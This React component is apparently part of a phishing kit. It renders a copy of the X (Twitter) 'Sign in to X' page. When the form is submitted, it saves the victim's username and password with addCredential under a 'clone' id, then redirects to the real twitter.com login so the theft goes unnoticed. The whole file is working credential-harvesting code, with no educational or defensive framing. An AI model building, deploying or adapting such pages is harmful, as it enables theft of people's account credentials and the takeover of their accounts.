'use client';
import { useState } from 'react';
import { useClones } from '@/hooks/use-clones';
import type { Clone } from '@/lib/types';

const XLogo = () => (
    <svg viewBox="0 0 24 24" aria-hidden="true" className="w-8 h-8 text-black fill-current">
        <g>
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
        </g>
    </svg>
);


export default function TwitterPage({ clone }: { clone: Clone }) {
  const { addCredential } = useClones();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (username) {
        addCredential(clone.id, { username, password });
    }
    window.location.href = 'https://twitter.com/login';
  };

  return (
    <div className="bg-white min-h-screen flex flex-col items-center justify-center font-sans text-black">
      <div className="w-full max-w-sm p-4">
        <div className="flex justify-center mb-8">
            <XLogo />
        </div>
        <h1 className="text-3xl font-extrabold mb-6 text-center">Sign in to X</h1>
        <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Phone, email, or username"
                className="w-full px-4 py-3 border border-gray-300 rounded-md bg-white focus:outline-none focus:ring-2 focus:ring-sky-500"
                required
              />
            </div>
             <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full px-4 py-3 border border-gray-300 rounded-md bg-white focus:outline-none focus:ring-2 focus:ring-sky-500"
              />
            </div>
          <button
            type="submit"
            className="w-full bg-black text-white py-3 rounded-full font-bold hover:bg-gray-800 transition-colors"
          >
            Sign in
          </button>
        </form>
         <div className="text-center mt-4">
            <a href="#" className="text-sm text-sky-500 hover:underline">
                Forgot password?
            </a>
        </div>
        <div className="mt-6 text-center text-gray-500">
            Don't have an account? <a href="#" className="text-sky-500 hover:underline">Sign up</a>
        </div>
      </div>
    </div>
  );
}
